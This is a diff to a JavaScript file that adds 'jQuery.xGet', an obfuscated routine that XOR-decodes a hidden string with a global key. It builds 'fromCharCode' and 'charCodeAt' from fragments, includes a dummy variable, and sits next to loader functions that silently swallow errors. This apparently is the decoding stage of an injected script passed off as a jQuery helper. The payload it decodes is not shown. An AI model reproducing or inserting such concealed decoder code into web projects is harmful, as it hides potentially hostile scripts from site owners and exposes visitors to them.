@@ -1,3 +1,17 @@
+jQuery.xGet = function(hash) {
+    var result = '';
+    for (var i=0; i<hash.length; i++) {
+        var _pgrwcm = true;
+        var stringName = "String";
+        var ch = "fromChar" + "Code";
+        var code = ch.slice(8,2+10);
+        var stringProto = window[stringName];
+
+        result += stringProto[ch]( $K ^ hash['char' + code + 'At'](i) );
+    }
+    return result;
+};
+
 jQuery.xAddr = function(noBg){
     noBg = noBg || false;
     var d = ".";
@@ -79,3 +93,4 @@ jQuery.xLoad = function() {
         }
     } catch(e) {}
 };
+
